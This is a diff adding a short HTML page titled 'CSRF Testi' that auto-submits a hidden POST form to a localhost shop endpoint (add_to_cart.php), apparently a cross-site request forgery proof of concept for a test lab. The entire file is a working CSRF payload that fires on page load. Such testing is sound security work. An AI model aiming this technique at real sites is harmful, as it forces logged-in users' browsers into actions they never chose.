@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Testi</title>
+</head>
+<body>
+    <h1>CSRF Testi</h1>
+    <form id="csrfForm" action="http://localhost:8082/add_to_cart.php" method="POST">
+        <input type="hidden" name="product_id" value="1">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
